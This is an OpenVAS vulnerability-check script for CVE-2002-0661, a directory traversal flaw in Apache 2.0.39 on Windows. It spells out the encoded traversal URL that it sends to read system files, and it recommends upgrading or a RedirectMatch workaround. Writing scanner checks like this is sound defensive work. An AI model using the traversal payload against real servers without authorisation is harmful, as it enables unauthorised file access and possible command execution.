###############################################################################
# OpenVAS Vulnerability Test
#
# Apache 2.0.39 Win32 directory traversal
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# starting from badblue_directory_traversal.nasl by SecurITeam.
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11092");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2002-0661");
  script_bugtraq_id(5434);
  script_name("Apache 2.0.39 Win32 directory traversal");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Web Servers");
  script_dependencies("secpod_apache_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("apache/installed", "Host/runs_windows");

  script_tag(name:"summary", value:"Apache 2.0.39 Win32 directory traversal.");

  script_tag(name:"vuldetect", value:"Sends a crafted GET request and checks the response.");

  script_tag(name:"insight", value:"A security vulnerability in Apache 2.0.39 on Windows systems
  allows attackers to access files that would otherwise be inaccessible using a directory traversal attack.");

  script_tag(name:"impact", value:"A cracker may use this to read sensitive files or even execute any
  command on your system.");

  script_tag(name:"affected", value:"Apache 2.0 through 2.0.39 on Windows.");

  script_tag(name:"solution", value:"Upgrade to Apache 2.0.40 or later.

  As a workaround add in the httpd.conf, before the first 'Alias' or 'Redirect' directive:

  RedirectMatch 400 \\\.\.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("host_details.inc");

port = http_get_port( default:80 );
banner = http_get_remote_headers( port:port );
if( ! banner || "Apache" >!< banner )
  exit( 0 );

files = traversal_files( "windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  file = str_replace( string:file, find:"/", replace:"%5c" );

  url = "/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c" + file;

  if( http_vuln_check( port:port, url:url, pattern:pattern, check_header:TRUE ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

if( egrep( string:banner, pattern:"^Server: *Apache(-AdvancedExtranetServer)?/2\.0\.[0-3][0-9]* *\(Win32\)" ) ) {
  report  = '** The Scanner found that your server should be vulnerable according to\n';
  report += '** its version number but could not exploit the flaw.\n';
  report += '** You may have already applied the RedirectMatch wordaround.\n';
  report += "** Anyway, you should upgrade your server to Apache 2.0.40";
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
